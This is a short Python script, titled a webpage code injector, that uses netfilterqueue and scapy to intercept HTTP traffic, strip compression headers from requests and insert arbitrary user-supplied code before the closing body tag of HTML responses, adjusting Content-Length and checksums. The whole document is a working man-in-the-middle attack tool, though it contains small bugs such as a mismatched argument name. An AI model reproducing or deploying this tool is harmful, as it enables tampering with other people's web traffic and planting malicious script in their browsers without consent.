# A Webpage Code Injector
import netfilterqueue
import scapy.all as scapy
import re
import argparse

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--inject', dest='injecr', help='Code to inject in Webpage')
    (val) =  parser.parse_args()
    if not val.inject:
        parser.error('INVALID ARGS, USE --help')
    return val

def sload(pacc, load):
    pacc[scapy.Raw].load = load
    del pacc[scapy.IP].len
    del pacc[scapy.IP].chksum
    del pacc[scapy.TCP].chksum
    return pacc

def ppacc(pacc):
    scapypacc = scapy.IP(pacc.get_payload())
    if scapypacc.haslayer(scapy.Raw):
        try:
            load = scapypacc[scapy.Raw].load.decode()
            if scapypacc[scapy.TCP].dport == 80:
                print('\nREQUEST!')
                load = re.sub('Accept Encoding:.*?\\r\\n', '', load)

            elif scapypacc[scapy.TCP].sport == 80:
                    print('\nRESPONSE!')
                    #print(scapypacc.show())
                    inject = val.inject
                    load = load.replace('</body>', inject+'</body>')
                    clengthS = re.search('(?:Content-Length:\s)(\d*)', load)
                    if clengthS and 'text/html' in load:
                        clength = clengthS.group(1)
                        nclength = int(clength) + len(inject)
                        load = load.replace(clength, str(nclength))
                        
            if load != scapypacc[scapy.Raw].load:
                    npacc = sload(scapypacc, load)
                    pacc.set_payload(bytes(npacc))
        except UnicodeDecodeError:
            pass

    pacc.accept()

val = args()
que = netfilterqueue.NetfilterQueue()
que.bind(0, ppacc)
que.run()
